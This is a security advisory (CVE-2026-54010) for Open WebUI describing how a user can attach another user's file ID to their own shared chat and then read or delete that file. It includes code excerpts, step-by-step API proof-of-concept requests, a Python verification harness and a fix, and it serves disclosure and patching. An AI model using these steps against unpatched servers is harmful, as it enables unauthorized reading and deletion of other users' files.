# [H] Open WebUI: Forged chat-file link allows cross-user file read and deletion

## Summary
Severity: High
Advisory: GHSA-vrhc-3fr6-pc3c
CVE: CVE-2026-54010
CWE: CWE-284, CWE-639, CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-vrhc-3fr6-pc3c
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
## Summary

Open WebUI `v0.9.5` lets an authenticated user attach arbitrary `file_id` values to their own chat message without checking whether they own or can read those files. If the attacker then shares that chat and grants themselves read access, `has_access_to_file()` treats the victim file as accessible through the shared chat, and the file endpoints read or delete the victim file.

## Impact

Security boundary crossed: file confidentiality and integrity.

An authenticated attacker who knows or obtains a victim `file_id` can make Open WebUI authorize, through an attacker-owned shared chat:

- reading the victim file via `GET /api/v1/files/{id}/content`, and
- deleting the victim file via `DELETE /api/v1/files/{id}`.

## Root Cause

Client-controlled message file IDs are persisted without file authorization checks:

```python
# backend/open_webui/main.py
await Chats.insert_chat_files(
    chat_id,
    user_message.get('id'),
    [
        file_item.get('id')
        for file_item in user_message_files
        if file_item.get('type') == 'file'
    ],
    user.id,
)
```

`insert_chat_files()` stores the provided IDs directly:

```python
# backend/open_webui/models/chats.py
ChatFileModel(
    user_id=user_id,
    chat_id=chat_id,
    message_id=message_id,
    file_id=file_id,
)
```

Later, file authorization trusts shared-chat associations:

```python
# backend/open_webui/utils/access_control/files.py
shared_chat_ids = await Chats.get_shared_chat_ids_by_file_id(file_id, db=db)
if shared_chat_ids:
    accessible_ids = await AccessGrants.get_accessible_resource_ids(
        user_id=user.id,
        resource_type='shared_chat',
        resource_ids=shared_chat_ids,
        permission='read',
    )
    if accessible_ids:
        return True
```

The download endpoint uses this helper:

```python
# backend/open_webui/routers/files.py
if file.user_id == user.id or user.role == 'admin' or await has_access_to_file(id, 'read', user, db=db):
    return FileResponse(file_path, ...)
```

On affected versions this shared-chat branch is not gated on `access_type` (the grant lookup hardcodes `permission='read'`, but nothing checks that the request itself is a read). The same forged association therefore also satisfies the `write` check that `DELETE /api/v1/files/{id}` performs, so the attacker can delete the victim file, not only read it.

Because the shared-chat branch ignores `access_type`, the deletion does not require the forged association at all. A user granted only **read** access to a chat that the owner legitimately shared can delete the owner's own files attached to that chat via `DELETE /api/v1/files/{id}`, since the read grant satisfies the `write` check. The forged association (above) broadens this to any victim `file_id`; a legitimate read-only share reaches it without any forgery.

## PoC

1. Attacker creates or uses a chat they own.
2. Attacker sends `POST /api/chat/completions` or `POST /api/v1/chat/completions` where top-level `user_message.files` contains:

```json
[
  {
    "type": "file",
    "id": "VICTIM_FILE_ID"
  }
]
```

3. Backend inserts a `chat_file` row linking the attacker chat to `VICTIM_FILE_ID`.
4. Attacker shares the chat and grants read access to themselves or public access.
5. Attacker requests:

```text
GET /api/v1/files/VICTIM_FILE_ID/content
```

Expected: 404/403 because the attacker does not own or otherwise have access to the victim file.

Actual: file authorization succeeds through the attacker-controlled shared-chat association.

## Local Verification

I verified the bug locally with Open WebUI's real `Chats.insert_chat_files()` and real `has_access_to_file()` implementations. The harness uses fake DB adapters only to avoid this environment's async SQLite hang; the security-sensitive logic under test is the application code.

Result:

```json
{
  "before_chat_file_link_attacker_can_read": false,
  "insert_sink": {
    "db_commit_called": true,
    "insert_returned_rows": true,
    "stored_chat_ids": [
      "attacker-chat"
    ],
    "stored_file_ids": [
      "victim-file"
    ],
    "stored_user_ids": [
      "attacker"
    ]
  },
  "after_attacker_shared_chat_links_victim_file_attacker_can_read": true,
  "confirmed": true
}
```

PoC:

```python
#!/usr/bin/env python3
"""
Verifier for chat-file link authorization bypass.

This intentionally avoids the app DB because the local Python 3.13 async SQLite
stack hangs in this checkout. It still executes Open WebUI's real
has_access_to_file() implementation, with fake model adapters standing in for
the DB tables.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import types
from pathlib import Path
from types import SimpleNamespace


def prepare_imports() -> None:
    repo_root = Path(__file__).resolve().parents[1]
    sys.path.insert(0, str(repo_root / "backend"))
    os.environ["VECTOR_DB"] = "none"

    class DummyTyper:
        def command(self, *args, **kwargs):
            return lambda fn: fn

    sys.modules.setdefault(
        "typer",
        types.SimpleNamespace(
            Typer=lambda *args, **kwargs: DummyTyper(),
            Option=lambda *args, **kwargs: None,
            echo=lambda *args, **kwargs: None,
            Exit=Exception,
        ),
    )
    sys.modules.setdefault("uvicorn", types.SimpleNamespace(run=lambda *args, **kwargs: None))


class FakeFiles:
    async def get_file_by_id(self, file_id, db=None):
        if file_id == "victim-file":
            return SimpleNamespace(
                id="victim-file",
                user_id="victim",
                meta={},
            )
        return None


class FakeKnowledges:
    async def get_knowledges_by_file_id(self, file_id, db=None):
        return []


class FakeGroups:
    async def get_groups_by_member_id(self, user_id, db=None):
        return []


class FakeChannels:
    async def get_channels_by_file_id_and_user_id(self, file_id, user_id, db=None):
        return []


class FakeModels:
    async def get_models_by_user_id(self, user_id, permission="read", db=None):
        return []


class FakeChats:
    def __init__(self, linked: bool):
        self.linked = linked

    async def get_shared_chat_ids_by_file_id(self, file_id, db=None):
        if self.linked and file_id == "victim-file":
            # This mirrors a chat_file row tying victim-file to the attacker's
            # shared chat. The real insertion sink is Chats.insert_chat_files().
            return ["attacker-chat"]
        return []


class FakeAccessGrants:
    def __init__(self, granted: bool):
        self.granted = granted

    async def has_access(self, *args, **kwargs):
        return False

    async def get_accessible_resource_ids(
        self,
        user_id,
        resource_type,
        resource_ids,
        permission="read",
        user_group_ids=None,
        db=None,
    ):
        if (
            self.granted
            and user_id == "attacker"
            and resource_type == "shared_chat"
            and "attacker-chat" in resource_ids
            and permission == "read"
        ):
            return {"attacker-chat"}
        return set()


class FakeDb:
    def __init__(self):
        self.added = []
        self.committed = False

    def add_all(self, rows):
        self.added.extend(rows)

    async def commit(self):
        self.committed = True


class FakeDbContext:
    def __init__(self, db):
        self.db = db

    async def __aenter__(self):
        return self.db

    async def __aexit__(self, exc_type, exc, tb):
        return False


async def verify_insert_sink_accepts_victim_file_id():
    import open_webui.models.chats as chats_module

    fake_db = FakeDb()
    chats_table = chats_module.Chats

    original_context = chats_module.get_async_db_context
    original_existing = chats_table.get_chat_files_by_chat_id_and_message_id

    async def fake_existing(self, chat_id, message_id, db=None):
        return []

    try:
        chats_module.get_async_db_context = lambda db=None: FakeDbContext(fake_db)
        chats_table.get_chat_files_by_chat_id_and_message_id = types.MethodType(fake_existing, chats_table)

        inserted = await chats_table.insert_chat_files(
            chat_id="attacker-chat",
            message_id="attacker-message",
            file_ids=["victim-file"],
            user_id="attacker",
        )
    finally:
        chats_module.get_async_db_context = original_context
        chats_table.get_chat_files_by_chat_id_and_message_id = original_existing

    return {
        "insert_returned_rows": bool(inserted),
        "db_commit_called": fake_db.committed,
        "stored_file_ids": [getattr(row, "file_id", None) for row in fake_db.added],
        "stored_chat_ids": [getattr(row, "chat_id", None) for row in fake_db.added],
        "stored_user_ids": [getattr(row, "user_id", None) for row in fake_db.added],
    }


async def main() -> None:
    prepare_imports()

    import open_webui.utils.access_control.files as file_acl

    attacker = SimpleNamespace(id="attacker", role="user")

    original = {
        "Files": file_acl.Files,
        "Knowledges": file_acl.Knowledges,
        "Groups": file_acl.Groups,
        "Channels": file_acl.Channels,
        "Chats": file_acl.Chats,
        "Models": file_acl.Models,
        "AccessGrants": file_acl.AccessGrants,
    }

    try:
        file_acl.Files = FakeFiles()
        file_acl.Knowledges = FakeKnowledges()
        file_acl.Groups = FakeGroups()
        file_acl.Channels = FakeChannels()
        file_acl.Models = FakeModels()

        file_acl.Chats = FakeChats(linked=False)
        file_acl.AccessGrants = FakeAccessGrants(granted=False)
        before = await file_acl.has_access_to_file("victim-file", "read", attacker)

        file_acl.Chats = FakeChats(linked=True)
        file_acl.AccessGrants = FakeAccessGrants(granted=True)
        after = await file_acl.has_access_to_file("victim-file", "read", attacker)

        insert_sink = await verify_insert_sink_accepts_victim_file_id()

        result = {
            "victim_file_id": "victim-file",
            "victim_file_owner": "victim",
            "attacker_id": "attacker",
            "attacker_owns_file": False,
            "insert_sink": insert_sink,
            "before_chat_file_link_attacker_can_read": before,
            "after_attacker_shared_chat_links_victim_file_attacker_can_read": after,
            "confirmed": (
                before is False
                and after is True
                and insert_sink["insert_returned_rows"] is True
                and insert_sink["stored_file_ids"] == ["victim-file"]
                and insert_sink["stored_user_ids"] == ["attacker"]
            ),
            "sink": "Chats.insert_chat_files() accepts caller-supplied file_ids without checking file ownership/read access",
        }
        print(json.dumps(result, indent=2, sort_keys=True))
    finally:
        for name, value in original.items():
            setattr(file_acl, name, value)


if __name__ == "__main__":
    asyncio.run(main())
```

## Recommended Fix

Before calling `Chats.insert_chat_files()`, filter `user_message.files` to files the caller owns or can read:

```python
allowed_file_ids = []
for file_id in requested_file_ids:
    file = await Files.get_file_by_id(file_id)
    if file and (file.user_id == user.id or user.role == 'admin' or await has_access_to_file(file_id, 'read', user)):
        allowed_file_ids.append(file_id)
```

Also consider enforcing this inside `Chats.insert_chat_files()` so future call sites cannot create unauthorized `chat_file` associations.

Additionally, the shared-chat branch of `has_access_to_file()` should honour `access_type`, so a read grant cannot satisfy the write check used by file deletion.

## Consolidation

Per Open WebUI's Report Handling policy this consolidates independent reports of the same chat-file authorization flaws into one advisory and CVE:

- Cross-user file READ via a forged `chat_file` association (`GET /api/v1/files/{id}/content`): @0xEr3n. Fixed by #25054, which gates `Chats.insert_chat_files()` so a caller can only link files they own or can read.
- Cross-user file DELETION via the shared-chat branch ignoring `access_type` (`DELETE /api/v1/files/{id}`): reported independently by @oxsignal (earliest filing; reached via a legitimately read-only-shared chat, no forged association needed), by @0xEr3n (via the forged association), and by @5yu4n. Fixed by #24755, which makes the shared-chat branch honour `access_type`.

Affected: `<= 0.9.5`. Patched: `>= 0.9.6`. One CVE for the consolidated advisory.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-vrhc-3fr6-pc3c
- https://nvd.nist.gov/vuln/detail/CVE-2026-54010
- https://github.com/open-webui/open-webui/pull/24755
- https://github.com/open-webui/open-webui/pull/25054
- https://github.com/advisories/GHSA-vrhc-3fr6-pc3c
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2763.yaml
- https://pypi.org/project/open-webui
